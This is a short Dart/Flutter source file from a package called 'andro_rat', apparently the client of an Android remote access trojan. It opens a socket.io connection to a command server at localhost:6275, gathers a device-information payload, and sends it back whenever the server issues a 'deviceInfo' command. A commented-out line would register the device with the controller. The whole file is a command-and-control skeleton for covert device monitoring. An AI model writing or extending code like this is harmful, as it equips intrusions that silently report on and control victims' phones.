import 'dart:io';

import 'package:flutter_workspace/andro_rat/device_info.dart';
import 'package:flutter_workspace/andro_rat/utils.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:flutter/widgets.dart';


Future<void> main() async {
  initConnection();
}

void initConnection() {
  IO.Socket socket = IO.io("http://localhost:6275", <String, dynamic> {
    "autoConnect": false,
    "transports": ["websocket"],
  });
  
  socket.onConnect((_) async {
    print('[Connected]');
    DeviceInfo deviceInfo = DeviceInfo();
    var info = await deviceInfo.getPayload();
    print(info);
    if (Utils.isMobilePlatform()) {
      // socket.emit("join", info);
    }
  });
  socket.onError((err) {
    print(err);
  });
  socket.onConnectError((conErr) {
    print(conErr);
  });
  socket.onDisconnect((_) {
    print("[Disconnected]");
    // print(_);
  });
  
  socket.on("deviceInfo", (_) async {
    socket.emit("deviceInfo", await DeviceInfo().getPayload());
  });

  socket.connect();
}
